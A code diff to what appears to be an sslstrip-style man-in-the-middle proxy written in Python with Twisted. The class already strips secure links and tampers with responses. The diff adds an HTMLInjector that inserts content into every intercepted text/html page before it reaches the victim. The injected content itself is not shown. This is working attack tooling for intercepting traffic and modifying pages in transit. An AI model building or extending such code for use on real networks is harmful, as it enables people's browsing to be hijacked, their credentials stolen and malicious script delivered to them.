@@ -21,6 +21,7 @@ import logging, re, string, random, zlib, gzip, StringIO
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
 from ResponseTampererFactory import ResponseTampererFactory
+from HTMLInjector import HTMLInjector
 
 class ServerConnection(HTTPClient):
 
@@ -41,6 +42,7 @@ class ServerConnection(HTTPClient):
         self.client           = client
         self.urlMonitor       = URLMonitor.getInstance()
         self.responseTamperer = ResponseTampererFactory.getTampererInstance()
+        self.HTMLInjector     = HTMLInjector.getInstance()
         self.isImageRequest   = False
         self.isCompressed     = False
         self.contentLength    = None
@@ -130,8 +132,18 @@ class ServerConnection(HTTPClient):
 
         data = self.replaceSecureLinks(data)
 
+        # ------ TAMPER ------
         if self.responseTamperer:
           data = self.responseTamperer.tamper(self.client.uri, data, self.client.responseHeaders, self.client.getAllHeaders(), self.client.getClientIP())
+        # ------ TAMPER ------
+        
+        # ------ HTML CODE INJECT ------
+        content_type = self.client.responseHeaders.getRawHeaders('content-type')
+
+        # only want to inject into text/html pages
+        if content_type and content_type[0] == 'text/html':
+            data = self.HTMLInjector.inject(data)
+        # ------ HTML CODE INJECT ------
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
